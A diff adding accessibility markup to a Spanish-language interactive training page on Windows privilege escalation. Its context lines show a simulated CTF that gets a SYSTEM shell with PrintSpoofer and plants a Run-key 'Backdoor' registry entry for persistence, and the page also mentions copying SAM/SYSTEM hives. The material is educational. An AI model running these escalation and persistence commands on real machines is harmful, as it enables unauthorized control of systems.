@@ -28,17 +28,17 @@
 <body>
   <div class="container">
     <div class="header">
-      <h1>🪟 Escalamiento de Privilegios en Windows</h1>
+      <h1><span aria-hidden="true">🪟</span> Escalamiento de Privilegios en Windows</h1>
       <p>Guía interactiva completa — desde usuario limitado hasta SYSTEM/Admin</p>
     </div>
 
-    <div class="nav">
-      <a href="index.html">🏠 Inicio</a>
-      <a href="index.html">🐧 Linux</a>
-      <a href="windows-privesc.html">🪟 Windows</a>
-      <a href="mitigation.html">🛡️ Mitigación</a>
-      <a href="labs.html">🧪 Laboratorios</a>
-    </div>
+    <nav class="nav" aria-label="Secciones">
+      <a href="index.html"><span aria-hidden="true">🏠</span> Inicio</a>
+      <a href="index.html"><span aria-hidden="true">🐧</span> Linux</a>
+      <a href="windows-privesc.html" aria-current="page"><span aria-hidden="true">🪟</span> Windows</a>
+      <a href="mitigation.html"><span aria-hidden="true">🛡️</span> Mitigación</a>
+      <a href="labs.html"><span aria-hidden="true">🧪</span> Laboratorios</a>
+    </nav>
 
     <div class="tabs">
       <button class="tab active" data-tab="basics">Fundamentos</button>
@@ -52,7 +52,7 @@
     <!-- FUNDAMENTOS -->
     <div id="basics" class="panel active">
       <div class="card">
-        <div class="card-title">💡 ¿Por qué Windows es diferente?</div>
+        <h2 class="card-title"><span aria-hidden="true">💡</span> ¿Por qué Windows es diferente?</h2>
         <div class="card-desc">
           En Windows no existe un único usuario "root". El equivalente es <code>NT AUTHORITY\SYSTEM</code> o pertenecer al grupo <code>Administrators</code>. Las técnicas de escalamiento aprovechan privilegios mal configurados, servicios vulnerables, y el modelo de tokens de Windows.
         </div>
@@ -60,7 +60,7 @@
 
       <div class="grid-2">
         <div class="card">
-          <div class="card-title">👤 Cuentas clave</div>
+          <h2 class="card-title"><span aria-hidden="true">👤</span> Cuentas clave</h2>
           <ul class="num-list">
             <li><span class="num">•</span><code>NT AUTHORITY\SYSTEM</code> — El "root" de Windows</li>
             <li><span class="num">•</span><code>Administrator</code> — Cuenta con privilegios elevados</li>
@@ -68,7 +68,7 @@
           </ul>
         </div>
         <div class="card">
-          <div class="card-title">🔑 Privilegios críticos</div>
+          <h2 class="card-title"><span aria-hidden="true">🔑</span> Privilegios críticos</h2>
           <ul class="num-list">
             <li><span class="num">•</span><code>SeImpersonatePrivilege</code> — JuicyPotato/PrintSpoofer</li>
             <li><span class="num">•</span><code>SeBackupPrivilege</code> — Leer cualquier archivo</li>
@@ -79,7 +79,7 @@
       </div>
 
       <div class="card">
-        <div class="card-title">📋 Flujo de Trabajo en Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">📋</span> Flujo de Trabajo en Windows</h2>
         <ul class="num-list">
           <li><span class="num">1</span> Shell inicial (cmd.exe o powershell)</li>
           <li><span class="num">2</span> Enumerar: usuario, grupos, privilegios, servicios</li>
@@ -93,14 +93,14 @@
     <!-- ENUMERACIÓN -->
     <div id="enum" class="panel">
       <div class="card">
-        <div class="card-title">🔍 Enumeración en Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">🔍</span> Enumeración en Windows</h2>
         <div class="card-desc">Windows requiere un enfoque diferente. PowerShell y comandos nativos son tu mejor aliado.</div>
       </div>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>🖥️ Información del Sistema</span>
-          <span class="acc-icon">▼</span>
+          <span><span aria-hidden="true">🖥️</span> Información del Sistema</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -115,8 +115,8 @@
 
       <div class="accordion">
         <div class="acc-header">
-          <span>👤 Usuario, Grupos y Privilegios</span>
-          <span class="acc-icon">▼</span>
+          <span><span aria-hidden="true">👤</span> Usuario, Grupos y Privilegios</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -135,8 +135,8 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>⚙️ Servicios y Procesos</span>
-          <span class="acc-icon">▼</span>
+          <span><span aria-hidden="true">⚙️</span> Servicios y Procesos</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -152,8 +152,8 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>🔐 Búsqueda de Archivos Sensibles</span>
-          <span class="acc-icon">▼</span>
+          <span><span aria-hidden="true">🔐</span> Búsqueda de Archivos Sensibles</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -169,15 +169,15 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
     <!-- TÉCNICAS -->
     <div id="techniques" class="panel">
       <div class="card">
-        <div class="card-title">🎯 Técnicas de Escalamiento en Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">🎯</span> Técnicas de Escalamiento en Windows</h2>
         <div class="card-desc">Selecciona una técnica para ver el exploit paso a paso.</div>
       </div>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>1️⃣ Token Impersonation (JuicyPotato / PrintSpoofer)</span>
+          <span><span aria-hidden="true">1️⃣</span> Token Impersonation (JuicyPotato / PrintSpoofer)</span>
           <span class="badge badge-green" style="margin-left:auto;margin-right:10px">Fácil</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="card-desc">Requiere <code>SeImpersonatePrivilege</code> o <code>SeAssignPrimaryTokenPrivilege</code>.</div>
@@ -193,9 +193,9 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>2️⃣ Unquoted Service Path</span>
+          <span><span aria-hidden="true">2️⃣</span> Unquoted Service Path</span>
           <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="card-desc">Si un servicio tiene una ruta sin comillas y espacios, Windows interpreta mal la ejecución.</div>
@@ -213,9 +213,9 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>3️⃣ Weak Service Permissions (DACL Abuse)</span>
+          <span><span aria-hidden="true">3️⃣</span> Weak Service Permissions (DACL Abuse)</span>
           <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="card-desc">Si puedes modificar el binario de un servicio que corre como SYSTEM:</div>
@@ -231,9 +231,9 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>4️⃣ Kernel Exploits (WinPEAS / windows-exploit-suggester)</span>
+          <span><span aria-hidden="true">4️⃣</span> Kernel Exploits (WinPEAS / windows-exploit-suggester)</span>
           <span class="badge badge-red" style="margin-left:auto;margin-right:10px">Avanzado</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -249,9 +249,9 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>5️⃣ AlwaysInstallElevated</span>
+          <span><span aria-hidden="true">5️⃣</span> AlwaysInstallElevated</span>
           <span class="badge badge-green" style="margin-left:auto;margin-right:10px">Fácil</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="terminal">
@@ -266,9 +266,9 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
 
       <div class="accordion">
         <div class="acc-header">
-          <span>6️⃣ SeBackupPrivilege / SeRestorePrivilege</span>
+          <span><span aria-hidden="true">6️⃣</span> SeBackupPrivilege / SeRestorePrivilege</span>
           <span class="badge badge-orange" style="margin-left:auto;margin-right:10px">Medio</span>
-          <span class="acc-icon">▼</span>
+          <span class="acc-icon" aria-hidden="true">▼</span>
         </div>
         <div class="acc-body">
           <div class="card-desc">Con SeBackup puedes leer cualquier archivo. Úsalo para copiar SAM y SYSTEM:</div>
@@ -287,12 +287,12 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
     <!-- HERRAMIENTAS -->
     <div id="tools" class="panel">
       <div class="card">
-        <div class="card-title">🛠️ Arsenal de Herramientas Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">🛠️</span> Arsenal de Herramientas Windows</h2>
         <div class="card-desc">Marca las que ya dominas.</div>
       </div>
 
       <div class="card">
-        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">📜 Scripts de Enumeración</div>
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;"><span aria-hidden="true">📜</span> Scripts de Enumeración</div>
         <label class="checklist-item"><input type="checkbox"><span><strong>WinPEAS</strong> — El LinPEAS de Windows. Enumera TODO.</span></label>
         <label class="checklist-item"><input type="checkbox"><span><strong>PowerUp</strong> — Módulo de PowerSploit para encontrar vectores.</span></label>
         <label class="checklist-item"><input type="checkbox"><span><strong>windows-exploit-suggester</strong> — Mapea patches faltantes a exploits.</span></label>
@@ -300,7 +300,7 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
       </div>
 
       <div class="card">
-        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">🎯 Binarios de Explotación</div>
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;"><span aria-hidden="true">🎯</span> Binarios de Explotación</div>
         <label class="checklist-item"><input type="checkbox"><span><strong>JuicyPotato</strong> — Abusa SeImpersonatePrivilege (Windows < 2019).</span></label>
         <label class="checklist-item"><input type="checkbox"><span><strong>PrintSpoofer</strong> — Alternativa moderna a JuicyPotato.</span></label>
         <label class="checklist-item"><input type="checkbox"><span><strong>GodPotato</strong> — Funciona en Windows Server 2019/2022.</span></label>
@@ -308,7 +308,7 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
       </div>
 
       <div class="card">
-        <div style="font-weight:700; font-size:14px; margin-bottom:12px;">💻 Comandos Nativos Esenciales</div>
+        <div style="font-weight:700; font-size:14px; margin-bottom:12px;"><span aria-hidden="true">💻</span> Comandos Nativos Esenciales</div>
         <div class="terminal">
 <span class="cmd">whoami /user /groups /priv</span>
 <span class="cmd">systeminfo</span>
@@ -322,7 +322,7 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
     <!-- SIMULADOR CTF -->
     <div id="ctf" class="panel">
       <div class="card">
-        <div class="card-title">🎮 Simulador: Escena del Crimen Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">🎮</span> Simulador: Escena del Crimen Windows</h2>
         <div class="card-desc">Tienes una shell como <code>svc_sql</code>. Analiza y escoge el vector correcto.</div>
       </div>
 
@@ -334,7 +334,7 @@ SeImpersonatePrivilege        Impersonate a client           Enabled</span>
           <div class="progress-step"></div>
         </div>
         <div class="card">
-          <div class="card-title">🔍 Paso 1: Reconocimiento</div>
+          <h2 class="card-title"><span aria-hidden="true">🔍</span> Paso 1: Reconocimiento</h2>
           <div class="terminal">
 <span class="cmd">PS C:\Users\svc_sql> whoami /priv</span>
 <span class="out">Privilege Name                Description                    State
@@ -359,7 +359,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
           <div class="progress-step"></div>
         </div>
         <div class="card">
-          <div class="card-title">✅ ¡Correcto! Shell como SYSTEM</div>
+          <h2 class="card-title"><span aria-hidden="true">✅</span> ¡Correcto! Shell como SYSTEM</h2>
           <div class="terminal">
 <span class="cmd">PS C:\Users\svc_sql> .\PrintSpoofer64.exe -i -c cmd</span>
 <span class="root">NT AUTHORITY\SYSTEM</span>
@@ -384,7 +384,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
           <div class="progress-step"></div>
         </div>
         <div class="card">
-          <div class="card-title">✅ Persistencia establecida</div>
+          <h2 class="card-title"><span aria-hidden="true">✅</span> Persistencia establecida</h2>
           <div class="terminal">
 <span class="root">C:\Windows\system32> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Users\Public\shell.exe" /f</span>
 <span class="out">The operation completed successfully.</span>
@@ -405,13 +405,13 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
           <div class="progress-step done"></div>
         </div>
         <div class="card result-card">
-          <div class="result-emoji">🏆</div>
+          <div class="result-emoji"><span aria-hidden="true">🏆</span></div>
           <div class="result-title">¡Misión Completada!</div>
           <div class="card-desc">Has escalado de svc_sql a SYSTEM, establecido persistencia y actuado con ética profesional.</div>
           <div style="margin-top:16px">
             <span class="badge badge-blue">CTF Completado</span>
           </div>
-          <button class="btn btn-primary" style="margin-top:16px" data-action="reset-ctf">🔄 Reiniciar Simulador</button>
+          <button class="btn btn-primary" style="margin-top:16px" data-action="reset-ctf"><span aria-hidden="true">🔄</span> Reiniciar Simulador</button>
         </div>
       </div>
     </div>
@@ -419,7 +419,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
     <!-- QUIZ -->
     <div id="quiz" class="panel">
       <div class="card">
-        <div class="card-title">🧠 Quiz Rápido — Windows</div>
+        <h2 class="card-title"><span aria-hidden="true">🧠</span> Quiz Rápido — Windows</h2>
         <div class="card-desc">5 preguntas para validar tu conocimiento.</div>
       </div>
 
@@ -467,7 +467,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
 
       <div id="quiz-result" style="display:none; margin-top:16px;">
         <div class="card result-card">
-          <div class="result-emoji">🎓</div>
+          <div class="result-emoji"><span aria-hidden="true">🎓</span></div>
           <div class="result-title" id="quiz-score-text"></div>
           <div class="card-desc" id="quiz-feedback"></div>
           <button class="btn btn-primary" style="margin-top:12px" data-action="reset-quiz">Reiniciar Quiz</button>
@@ -476,9 +476,9 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span>
     </div>
 
     <div class="footer">
-      <p>Hecho con 💻 para la comunidad de ciberseguridad.</p>
+      <p>Hecho con <span aria-hidden="true">💻</span> para la comunidad de ciberseguridad.</p>
       <p style="margin-top:6px">Recursos: <a href="https://gtfobins.github.io" target="_blank">GTFOBins</a> · <a href="https://github.com/carlospolop/PEASS-ng" target="_blank">WinPEAS</a> · <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit</a></p>
-      <p style="margin-top:10px; font-size:11px; color:#555;">⚠️ Uso exclusivo para fines educativos y pentesting autorizado.</p>
+      <p style="margin-top:10px; font-size:11px; color:#555;"><span aria-hidden="true">⚠️</span> Uso exclusivo para fines educativos y pentesting autorizado.</p>
     </div>
   </div>
   <script src="assets/site.js?v=20261110" defer></script>
